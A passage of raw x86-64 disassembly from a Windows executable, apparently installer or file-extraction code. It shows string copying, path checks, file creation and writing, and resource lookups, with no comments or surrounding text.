   1400074b2:	75 33                	jne    0x1400074e7
   1400074b4:	03 c3                	add    %ebx,%eax
   1400074b6:	4c 8d 0d 61 59 00 00 	lea    0x5961(%rip),%r9        # 0x14000ce1e
   1400074bd:	48 98                	cltq
   1400074bf:	49 8b d1             	mov    %r9,%rdx
   1400074c2:	49 2b c1             	sub    %r9,%rax
   1400074c5:	48 03 c8             	add    %rax,%rcx
   1400074c8:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   1400074cf:	48 85 c0             	test   %rax,%rax
   1400074d2:	74 44                	je     0x140007518
   1400074d4:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   1400074d7:	84 c0                	test   %al,%al
   1400074d9:	74 3d                	je     0x140007518
   1400074db:	88 02                	mov    %al,(%rdx)
   1400074dd:	49 03 d4             	add    %r12,%rdx
   1400074e0:	4d 2b c4             	sub    %r12,%r8
   1400074e3:	75 e3                	jne    0x1400074c8
   1400074e5:	eb 31                	jmp    0x140007518
   1400074e7:	03 c3                	add    %ebx,%eax
   1400074e9:	4c 8d 0d 2a 58 00 00 	lea    0x582a(%rip),%r9        # 0x14000cd1a
   1400074f0:	48 98                	cltq
   1400074f2:	49 8b d1             	mov    %r9,%rdx
   1400074f5:	49 2b c1             	sub    %r9,%rax
   1400074f8:	48 03 c8             	add    %rax,%rcx
   1400074fb:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140007502:	48 85 c0             	test   %rax,%rax
   140007505:	74 11                	je     0x140007518
   140007507:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   14000750a:	84 c0                	test   %al,%al
   14000750c:	74 0a                	je     0x140007518
   14000750e:	88 02                	mov    %al,(%rdx)
   140007510:	49 03 d4             	add    %r12,%rdx
   140007513:	4d 2b c4             	sub    %r12,%r8
   140007516:	75 e3                	jne    0x1400074fb
   140007518:	4d 85 c0             	test   %r8,%r8
   14000751b:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000751f:	49 8b d9             	mov    %r9,%rbx
   140007522:	4c 8d 05 d7 21 00 00 	lea    0x21d7(%rip),%r8        # 0x140009700
   140007529:	48 0f 45 c2          	cmovne %rdx,%rax
   14000752d:	48 8b cb             	mov    %rbx,%rcx
   140007530:	41 8b d5             	mov    %r13d,%edx
   140007533:	44 88 38             	mov    %r15b,(%rax)
   140007536:	e8 6d 06 00 00       	call   0x140007ba8
   14000753b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000753f:	48 ff c0             	inc    %rax
   140007542:	44 38 3c 03          	cmp    %r15b,(%rbx,%rax,1)
   140007546:	75 f7                	jne    0x14000753f
   140007548:	48 83 f8 03          	cmp    $0x3,%rax
   14000754c:	72 18                	jb     0x140007566
   14000754e:	8a 43 01             	mov    0x1(%rbx),%al
   140007551:	3c 3a                	cmp    $0x3a,%al
   140007553:	0f 84 31 fd ff ff    	je     0x14000728a
   140007559:	80 3b 5c             	cmpb   $0x5c,(%rbx)
   14000755c:	75 08                	jne    0x140007566
   14000755e:	3c 5c                	cmp    $0x5c,%al
   140007560:	0f 84 24 fd ff ff    	je     0x14000728a
   140007566:	33 c0                	xor    %eax,%eax
   140007568:	e9 56 01 00 00       	jmp    0x1400076c3
   14000756d:	8a 44 24 42          	mov    0x42(%rsp),%al
   140007571:	84 c0                	test   %al,%al
   140007573:	75 0c                	jne    0x140007581
   140007575:	44 89 25 88 57 00 00 	mov    %r12d,0x5788(%rip)        # 0x14000cd04
   14000757c:	e9 09 fd ff ff       	jmp    0x14000728a
   140007581:	3c 3a                	cmp    $0x3a,%al
   140007583:	0f 85 fe fc ff ff    	jne    0x140007287
   140007589:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   14000758e:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   140007593:	2c 22                	sub    $0x22,%al
   140007595:	f6 d8                	neg    %al
   140007597:	1b ff                	sbb    %edi,%edi
   140007599:	83 c7 04             	add    $0x4,%edi
   14000759c:	8b c7                	mov    %edi,%eax
   14000759e:	48 03 d8             	add    %rax,%rbx
   1400075a1:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400075a5:	48 ff c0             	inc    %rax
   1400075a8:	44 38 3c 03          	cmp    %r15b,(%rbx,%rax,1)
   1400075ac:	75 f7                	jne    0x1400075a5
   1400075ae:	48 85 c0             	test   %rax,%rax
   1400075b1:	75 0a                	jne    0x1400075bd
   1400075b3:	bf 02 00 00 00       	mov    $0x2,%edi
   1400075b8:	e9 ca fc ff ff       	jmp    0x140007287
   1400075bd:	ba 5b 00 00 00       	mov    $0x5b,%edx
   1400075c2:	48 8b cb             	mov    %rbx,%rcx
   1400075c5:	e8 1e 07 00 00       	call   0x140007ce8
   1400075ca:	48 85 c0             	test   %rax,%rax
   1400075cd:	74 12                	je     0x1400075e1
   1400075cf:	ba 5d 00 00 00       	mov    $0x5d,%edx
   1400075d4:	48 8b cb             	mov    %rbx,%rcx
   1400075d7:	e8 0c 07 00 00       	call   0x140007ce8
   1400075dc:	48 85 c0             	test   %rax,%rax
   1400075df:	74 d2                	je     0x1400075b3
   1400075e1:	ba 5d 00 00 00       	mov    $0x5d,%edx
   1400075e6:	48 8b cb             	mov    %rbx,%rcx
   1400075e9:	e8 fa 06 00 00       	call   0x140007ce8
   1400075ee:	48 85 c0             	test   %rax,%rax
   1400075f1:	74 12                	je     0x140007605
   1400075f3:	ba 5b 00 00 00       	mov    $0x5b,%edx
   1400075f8:	48 8b cb             	mov    %rbx,%rcx
   1400075fb:	e8 e8 06 00 00       	call   0x140007ce8
   140007600:	48 85 c0             	test   %rax,%rax
   140007603:	74 ae                	je     0x1400075b3
   140007605:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000760a:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   14000760e:	48 8b cb             	mov    %rbx,%rcx
   140007611:	e8 0e fa ff ff       	call   0x140007024
   140007616:	85 c0                	test   %eax,%eax
   140007618:	74 99                	je     0x1400075b3
   14000761a:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000761e:	4c 8d 0d fd 58 00 00 	lea    0x58fd(%rip),%r9        # 0x14000cf22
   140007625:	03 c7                	add    %edi,%eax
   140007627:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000762c:	48 98                	cltq
   14000762e:	4d 8b c5             	mov    %r13,%r8
   140007631:	49 2b c1             	sub    %r9,%rax
   140007634:	49 8b d1             	mov    %r9,%rdx
   140007637:	48 03 c8             	add    %rax,%rcx
   14000763a:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140007641:	48 85 c0             	test   %rax,%rax
   140007644:	74 11                	je     0x140007657
   140007646:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   140007649:	84 c0                	test   %al,%al
   14000764b:	74 0a                	je     0x140007657
   14000764d:	88 02                	mov    %al,(%rdx)
   14000764f:	49 03 d4             	add    %r12,%rdx
   140007652:	4d 2b c4             	sub    %r12,%r8
   140007655:	75 e3                	jne    0x14000763a
   140007657:	4d 85 c0             	test   %r8,%r8
   14000765a:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000765e:	bf 02 00 00 00       	mov    $0x2,%edi
   140007663:	48 0f 45 c2          	cmovne %rdx,%rax
   140007667:	44 88 38             	mov    %r15b,(%rax)
   14000766a:	e9 1b fc ff ff       	jmp    0x14000728a
   14000766f:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   140007674:	4c 8d 05 85 20 00 00 	lea    0x2085(%rip),%r8        # 0x140009700
   14000767b:	45 33 c9             	xor    %r9d,%r9d
   14000767e:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140007685:	00 
   140007686:	ba 21 05 00 00       	mov    $0x521,%edx
   14000768b:	33 c9                	xor    %ecx,%ecx
   14000768d:	e8 3a d7 ff ff       	call   0x140004dcc
   140007692:	48 8b 0d 97 51 00 00 	mov    0x5197(%rip),%rcx        # 0x14000c830
   140007699:	48 85 c9             	test   %rcx,%rcx
   14000769c:	74 0c                	je     0x1400076aa
   14000769e:	48 ff 15 93 1b 00 00 	rex.W call *0x1b93(%rip)        # 0x140009238
   1400076a5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400076aa:	33 c9                	xor    %ecx,%ecx
   1400076ac:	48 ff 15 cd 1c 00 00 	rex.W call *0x1ccd(%rip)        # 0x140009380
   1400076b3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400076b8:	cc                   	int3
   1400076b9:	41 8b f7             	mov    %r15d,%esi
   1400076bc:	8b c6                	mov    %esi,%eax
   1400076be:	eb 03                	jmp    0x1400076c3
   1400076c0:	41 8b c4             	mov    %r12d,%eax
   1400076c3:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   1400076c7:	48 33 cc             	xor    %rsp,%rcx
   1400076ca:	e8 a1 0d 00 00       	call   0x140008470
   1400076cf:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   1400076d6:	00 
   1400076d7:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   1400076db:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400076df:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   1400076e3:	49 8b e3             	mov    %r11,%rsp
   1400076e6:	41 5f                	pop    %r15
   1400076e8:	41 5e                	pop    %r14
   1400076ea:	41 5d                	pop    %r13
   1400076ec:	41 5c                	pop    %r12
   1400076ee:	5d                   	pop    %rbp
   1400076ef:	c3                   	ret
   1400076f0:	cc                   	int3
   1400076f1:	e8 52 0f 00 00       	call   0x140008648
   1400076f6:	cc                   	int3
   1400076f7:	cc                   	int3
   1400076f8:	cc                   	int3
   1400076f9:	cc                   	int3
   1400076fa:	cc                   	int3
   1400076fb:	cc                   	int3
   1400076fc:	cc                   	int3
   1400076fd:	cc                   	int3
   1400076fe:	cc                   	int3
   1400076ff:	cc                   	int3
   140007700:	48 83 ec 28          	sub    $0x28,%rsp
   140007704:	48 ff 15 f5 1a 00 00 	rex.W call *0x1af5(%rip)        # 0x140009200
   14000770b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007710:	8b c8                	mov    %eax,%ecx
   140007712:	0f b7 c0             	movzwl %ax,%eax
   140007715:	0d 00 00 07 80       	or     $0x80070000,%eax
   14000771a:	85 c9                	test   %ecx,%ecx
   14000771c:	0f 4e c1             	cmovle %ecx,%eax
   14000771f:	48 83 c4 28          	add    $0x28,%rsp
   140007723:	c3                   	ret
   140007724:	cc                   	int3
   140007725:	cc                   	int3
   140007726:	cc                   	int3
   140007727:	cc                   	int3
   140007728:	cc                   	int3
   140007729:	cc                   	int3
   14000772a:	cc                   	int3
   14000772b:	cc                   	int3
   14000772c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007731:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140007736:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000773b:	57                   	push   %rdi
   14000773c:	48 83 ec 50          	sub    $0x50,%rsp
   140007740:	48 8b 05 c1 48 00 00 	mov    0x48c1(%rip),%rax        # 0x14000c008
   140007747:	48 33 c4             	xor    %rsp,%rax
   14000774a:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000774f:	33 f6                	xor    %esi,%esi
   140007751:	48 8b e9             	mov    %rcx,%rbp
   140007754:	45 33 c9             	xor    %r9d,%r9d
   140007757:	bf 01 00 00 00       	mov    $0x1,%edi
   14000775c:	eb 6b                	jmp    0x1400077c9
   14000775e:	48 8b d0             	mov    %rax,%rdx
   140007761:	33 c9                	xor    %ecx,%ecx
   140007763:	48 ff 15 0e 1c 00 00 	rex.W call *0x1c0e(%rip)        # 0x140009378
   14000776a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000776f:	48 8b c8             	mov    %rax,%rcx
   140007772:	48 ff 15 df 1b 00 00 	rex.W call *0x1bdf(%rip)        # 0x140009358
   140007779:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000777e:	48 8b d8             	mov    %rax,%rbx
   140007781:	48 85 c0             	test   %rax,%rax
   140007784:	0f 84 89 00 00 00    	je     0x140007813
   14000778a:	4c 8d 40 08          	lea    0x8(%rax),%r8
   14000778e:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140007792:	48 ff c0             	inc    %rax
   140007795:	41 80 3c 00 00       	cmpb   $0x0,(%r8,%rax,1)
   14000779a:	75 f6                	jne    0x140007792
   14000779c:	8b 53 04             	mov    0x4(%rbx),%edx
   14000779f:	4c 8d 48 01          	lea    0x1(%rax),%r9
   1400077a3:	8b 0b                	mov    (%rbx),%ecx
   1400077a5:	4d 03 c8             	add    %r8,%r9
   1400077a8:	48 8b c5             	mov    %rbp,%rax
   1400077ab:	ff 15 9f 1e 00 00    	call   *0x1e9f(%rip)        # 0x140009650
   1400077b1:	48 8b cb             	mov    %rbx,%rcx
   1400077b4:	85 c0                	test   %eax,%eax
   1400077b6:	74 4b                	je     0x140007803
   1400077b8:	48 ff 15 51 1b 00 00 	rex.W call *0x1b51(%rip)        # 0x140009310
   1400077bf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400077c4:	03 f7                	add    %edi,%esi
   1400077c6:	44 8b ce             	mov    %esi,%r9d
   1400077c9:	4c 8d 05 00 22 00 00 	lea    0x2200(%rip),%r8        # 0x1400099d0
   1400077d0:	ba 14 00 00 00       	mov    $0x14,%edx
   1400077d5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400077da:	e8 6d 99 ff ff       	call   0x14000114c
   1400077df:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1400077e5:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400077ea:	33 c9                	xor    %ecx,%ecx
   1400077ec:	48 ff 15 f5 1a 00 00 	rex.W call *0x1af5(%rip)        # 0x1400092e8
   1400077f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400077f8:	48 85 c0             	test   %rax,%rax
   1400077fb:	0f 85 5d ff ff ff    	jne    0x14000775e
   140007801:	eb 1c                	jmp    0x14000781f
   140007803:	33 ff                	xor    %edi,%edi
   140007805:	48 ff 15 04 1b 00 00 	rex.W call *0x1b04(%rip)        # 0x140009310
   14000780c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007811:	eb 0c                	jmp    0x14000781f
   140007813:	c7 05 27 5d 00 00 14 	movl   $0x80070714,0x5d27(%rip)        # 0x14000d544
   14000781a:	07 07 80 
   14000781d:	33 ff                	xor    %edi,%edi
   14000781f:	8b c7                	mov    %edi,%eax
   140007821:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140007826:	48 33 cc             	xor    %rsp,%rcx
   140007829:	e8 42 0c 00 00       	call   0x140008470
   14000782e:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140007833:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   140007838:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   14000783d:	48 83 c4 50          	add    $0x50,%rsp
   140007841:	5f                   	pop    %rdi
   140007842:	c3                   	ret
   140007843:	cc                   	int3
   140007844:	cc                   	int3
   140007845:	cc                   	int3
   140007846:	cc                   	int3
   140007847:	cc                   	int3
   140007848:	cc                   	int3
   140007849:	cc                   	int3
   14000784a:	cc                   	int3
   14000784b:	cc                   	int3
   14000784c:	cc                   	int3
   14000784d:	cc                   	int3
   14000784e:	cc                   	int3
   14000784f:	cc                   	int3
   140007850:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007855:	44 8b d9             	mov    %ecx,%r11d
   140007858:	4c 8d 15 61 54 00 00 	lea    0x5461(%rip),%r10        # 0x14000ccc0
   14000785f:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   140007865:	bb 08 00 00 00       	mov    $0x8,%ebx
   14000786a:	33 d2                	xor    %edx,%edx
   14000786c:	41 8b c3             	mov    %r11d,%eax
   14000786f:	41 f7 f1             	div    %r9d
   140007872:	44 8b c2             	mov    %edx,%r8d
   140007875:	41 f7 d8             	neg    %r8d
   140007878:	1b c9                	sbb    %ecx,%ecx
   14000787a:	41 23 c9             	and    %r9d,%ecx
   14000787d:	45 03 c9             	add    %r9d,%r9d
   140007880:	2b ca                	sub    %edx,%ecx
   140007882:	41 03 cb             	add    %r11d,%ecx
   140007885:	41 01 0a             	add    %ecx,(%r10)
   140007888:	4d 8d 52 04          	lea    0x4(%r10),%r10
   14000788c:	48 83 eb 01          	sub    $0x1,%rbx
   140007890:	75 d8                	jne    0x14000786a
   140007892:	8d 43 01             	lea    0x1(%rbx),%eax
   140007895:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000789a:	c3                   	ret
   14000789b:	cc                   	int3
   14000789c:	cc                   	int3
   14000789d:	cc                   	int3
   14000789e:	cc                   	int3
   14000789f:	cc                   	int3
   1400078a0:	cc                   	int3
   1400078a1:	cc                   	int3
   1400078a2:	cc                   	int3
   1400078a3:	cc                   	int3
   1400078a4:	cc                   	int3
   1400078a5:	cc                   	int3
   1400078a6:	cc                   	int3
   1400078a7:	cc                   	int3
   1400078a8:	cc                   	int3
   1400078a9:	cc                   	int3
   1400078aa:	cc                   	int3
   1400078ab:	cc                   	int3
   1400078ac:	cc                   	int3
   1400078ad:	cc                   	int3
   1400078ae:	cc                   	int3
   1400078af:	cc                   	int3
   1400078b0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400078b5:	55                   	push   %rbp
   1400078b6:	56                   	push   %rsi
   1400078b7:	57                   	push   %rdi
   1400078b8:	48 81 ec 70 01 00 00 	sub    $0x170,%rsp
   1400078bf:	48 8b 05 42 47 00 00 	mov    0x4742(%rip),%rax        # 0x14000c008
   1400078c6:	48 33 c4             	xor    %rsp,%rax
   1400078c9:	48 89 84 24 60 01 00 	mov    %rax,0x160(%rsp)
   1400078d0:	00 
   1400078d1:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   1400078d6:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400078db:	8b f1                	mov    %ecx,%esi
   1400078dd:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400078e2:	48 8d 0d 27 5d 00 00 	lea    0x5d27(%rip),%rcx        # 0x14000d610
   1400078e9:	41 ba 04 01 00 00    	mov    $0x104,%r10d
   1400078ef:	49 8b e9             	mov    %r9,%rbp
   1400078f2:	48 2b c8             	sub    %rax,%rcx
   1400078f5:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400078fa:	45 8b ca             	mov    %r10d,%r9d
   1400078fd:	49 8d 81 fa fe ff 7f 	lea    0x7ffffefa(%r9),%rax
   140007904:	48 85 c0             	test   %rax,%rax
   140007907:	74 11                	je     0x14000791a
   140007909:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   14000790c:	84 c0                	test   %al,%al
   14000790e:	74 0a                	je     0x14000791a
   140007910:	88 02                	mov    %al,(%rdx)
   140007912:	48 03 d3             	add    %rbx,%rdx
   140007915:	4c 2b cb             	sub    %rbx,%r9
   140007918:	75 e3                	jne    0x1400078fd
   14000791a:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000791e:	4d 85 c9             	test   %r9,%r9
   140007921:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007926:	48 0f 45 c2          	cmovne %rdx,%rax
   14000792a:	41 8b d2             	mov    %r10d,%edx
   14000792d:	c6 00 00             	movb   $0x0,(%rax)
   140007930:	e8 73 02 00 00       	call   0x140007ba8
   140007935:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000793b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007940:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140007947:	00 
   140007948:	45 33 c9             	xor    %r9d,%r9d
   14000794b:	45 33 c0             	xor    %r8d,%r8d
   14000794e:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140007955:	00 
   140007956:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000795b:	48 ff 15 d6 19 00 00 	rex.W call *0x19d6(%rip)        # 0x140009338
   140007962:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007967:	48 8b f8             	mov    %rax,%rdi
   14000796a:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000796e:	75 0e                	jne    0x14000797e
   140007970:	c7 05 ca 5b 00 00 52 	movl   $0x80070052,0x5bca(%rip)        # 0x14000d544
   140007977:	00 07 80 
   14000797a:	33 db                	xor    %ebx,%ebx
   14000797c:	eb 45                	jmp    0x1400079c3
   14000797e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140007984:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140007989:	44 8b c6             	mov    %esi,%r8d
   14000798c:	48 8b d5             	mov    %rbp,%rdx
   14000798f:	48 8b cf             	mov    %rdi,%rcx
   140007992:	48 ff 15 27 19 00 00 	rex.W call *0x1927(%rip)        # 0x1400092c0
   140007999:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000799e:	85 c0                	test   %eax,%eax
   1400079a0:	74 06                	je     0x1400079a8
   1400079a2:	3b 74 24 40          	cmp    0x40(%rsp),%esi
   1400079a6:	74 0c                	je     0x1400079b4
   1400079a8:	c7 05 92 5b 00 00 52 	movl   $0x80070052,0x5b92(%rip)        # 0x14000d544
   1400079af:	00 07 80 
   1400079b2:	33 db                	xor    %ebx,%ebx
   1400079b4:	48 8b cf             	mov    %rdi,%rcx
   1400079b7:	48 ff 15 7a 18 00 00 	rex.W call *0x187a(%rip)        # 0x140009238
   1400079be:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400079c3:	8b c3                	mov    %ebx,%eax
   1400079c5:	48 8b 8c 24 60 01 00 	mov    0x160(%rsp),%rcx
   1400079cc:	00 
   1400079cd:	48 33 cc             	xor    %rsp,%rcx
   1400079d0:	e8 9b 0a 00 00       	call   0x140008470
   1400079d5:	48 8b 9c 24 98 01 00 	mov    0x198(%rsp),%rbx
   1400079dc:	00 
   1400079dd:	48 81 c4 70 01 00 00 	add    $0x170,%rsp
   1400079e4:	5f                   	pop    %rdi
   1400079e5:	5e                   	pop    %rsi
   1400079e6:	5d                   	pop    %rbp
   1400079e7:	c3                   	ret
   1400079e8:	cc                   	int3
   1400079e9:	cc                   	int3
   1400079ea:	cc                   	int3
   1400079eb:	cc                   	int3
   1400079ec:	cc                   	int3
   1400079ed:	cc                   	int3
   1400079ee:	cc                   	int3
   1400079ef:	cc                   	int3
   1400079f0:	48 81 ec 48 01 00 00 	sub    $0x148,%rsp
   1400079f7:	48 8b 05 0a 46 00 00 	mov    0x460a(%rip),%rax        # 0x14000c008
   1400079fe:	48 33 c4             	xor    %rsp,%rax
   140007a01:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140007a08:	00 
   140007a09:	ba 04 01 00 00       	mov    $0x104,%edx
   140007a0e:	4c 8d 0d fb 5b 00 00 	lea    0x5bfb(%rip),%r9        # 0x14000d610
   140007a15:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140007a1a:	44 8b c2             	mov    %edx,%r8d
   140007a1d:	4c 2b c8             	sub    %rax,%r9
   140007a20:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007a25:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140007a2c:	48 85 c0             	test   %rax,%rax
   140007a2f:	74 13                	je     0x140007a44
   140007a31:	41 8a 04 09          	mov    (%r9,%rcx,1),%al
   140007a35:	84 c0                	test   %al,%al
   140007a37:	74 0b                	je     0x140007a44
   140007a39:	88 01                	mov    %al,(%rcx)
   140007a3b:	48 ff c1             	inc    %rcx
   140007a3e:	49 83 e8 01          	sub    $0x1,%r8
   140007a42:	75 e1                	jne    0x140007a25
   140007a44:	4d 85 c0             	test   %r8,%r8
   140007a47:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140007a4b:	4c 8d 05 56 1d 00 00 	lea    0x1d56(%rip),%r8        # 0x1400097a8
   140007a52:	48 0f 45 c1          	cmovne %rcx,%rax
   140007a56:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007a5b:	c6 00 00             	movb   $0x0,(%rax)
   140007a5e:	e8 45 01 00 00       	call   0x140007ba8
   140007a63:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007a68:	48 ff 15 99 17 00 00 	rex.W call *0x1799(%rip)        # 0x140009208
   140007a6f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007a74:	83 f8 ff             	cmp    $0xffffffff,%eax
   140007a77:	74 1d                	je     0x140007a96
   140007a79:	a8 10                	test   $0x10,%al
   140007a7b:	75 19                	jne    0x140007a96
   140007a7d:	33 d2                	xor    %edx,%edx
   140007a7f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007a84:	44 8d 42 08          	lea    0x8(%rdx),%r8d
   140007a88:	48 ff 15 41 18 00 00 	rex.W call *0x1841(%rip)        # 0x1400092d0
   140007a8f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007a94:	eb 13                	jmp    0x140007aa9
   140007a96:	48 8d 0d 0b 1d 00 00 	lea    0x1d0b(%rip),%rcx        # 0x1400097a8
   140007a9d:	48 ff 15 74 17 00 00 	rex.W call *0x1774(%rip)        # 0x140009218
   140007aa4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007aa9:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140007ab0:	00 
   140007ab1:	48 33 cc             	xor    %rsp,%rcx
   140007ab4:	e8 b7 09 00 00       	call   0x140008470
   140007ab9:	48 81 c4 48 01 00 00 	add    $0x148,%rsp
   140007ac0:	c3                   	ret
   140007ac1:	cc                   	int3
   140007ac2:	cc                   	int3
   140007ac3:	cc                   	int3
   140007ac4:	cc                   	int3
   140007ac5:	cc                   	int3
   140007ac6:	cc                   	int3
   140007ac7:	cc                   	int3
   140007ac8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007acd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007ad2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007ad7:	57                   	push   %rdi
   140007ad8:	48 83 ec 30          	sub    $0x30,%rsp
   140007adc:	48 8b 1d 8d 63 00 00 	mov    0x638d(%rip),%rbx        # 0x14000de70
   140007ae3:	49 8b e8             	mov    %r8,%rbp
   140007ae6:	48 8b cb             	mov    %rbx,%rcx
   140007ae9:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   140007aef:	49 8b f1             	mov    %r9,%rsi
   140007af2:	48 ff 15 ef 17 00 00 	rex.W call *0x17ef(%rip)        # 0x1400092e8
   140007af9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007afe:	48 85 c0             	test   %rax,%rax
   140007b01:	74 60                	je     0x140007b63
   140007b03:	48 8b d0             	mov    %rax,%rdx
   140007b06:	48 8b cb             	mov    %rbx,%rcx
   140007b09:	48 ff 15 68 18 00 00 	rex.W call *0x1868(%rip)        # 0x140009378
   140007b10:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007b15:	48 8b f8             	mov    %rax,%rdi
   140007b18:	48 85 c0             	test   %rax,%rax
   140007b1b:	74 46                	je     0x140007b63
   140007b1d:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140007b22:	4c 8b ce             	mov    %rsi,%r9
   140007b25:	4c 8b c5             	mov    %rbp,%r8
   140007b28:	48 8b d7             	mov    %rdi,%rdx
   140007b2b:	48 8b cb             	mov    %rbx,%rcx
   140007b2e:	48 85 c0             	test   %rax,%rax
   140007b31:	75 07                	jne    0x140007b3a
   140007b33:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   140007b38:	eb 05                	jmp    0x140007b3f
   140007b3a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007b3f:	48 ff 15 b2 19 00 00 	rex.W call *0x19b2(%rip)        # 0x1400094f8
   140007b46:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007b4b:	48 8b cf             	mov    %rdi,%rcx
   140007b4e:	48 8b d8             	mov    %rax,%rbx
   140007b51:	48 ff 15 b8 17 00 00 	rex.W call *0x17b8(%rip)        # 0x140009310
   140007b58:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007b5d:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140007b61:	75 24                	jne    0x140007b87
   140007b63:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140007b68:	45 33 c9             	xor    %r9d,%r9d
   140007b6b:	45 33 c0             	xor    %r8d,%r8d
   140007b6e:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140007b75:	00 
   140007b76:	ba fb 04 00 00       	mov    $0x4fb,%edx
   140007b7b:	33 c9                	xor    %ecx,%ecx
   140007b7d:	e8 4a d2 ff ff       	call   0x140004dcc
   140007b82:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140007b87:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140007b8c:	48 8b c3             	mov    %rbx,%rax
   140007b8f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140007b94:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140007b99:	48 83 c4 30          	add    $0x30,%rsp
   140007b9d:	5f                   	pop    %rdi
   140007b9e:	c3                   	ret
   140007b9f:	cc                   	int3
   140007ba0:	cc                   	int3
   140007ba1:	cc                   	int3
   140007ba2:	cc                   	int3
   140007ba3:	cc                   	int3
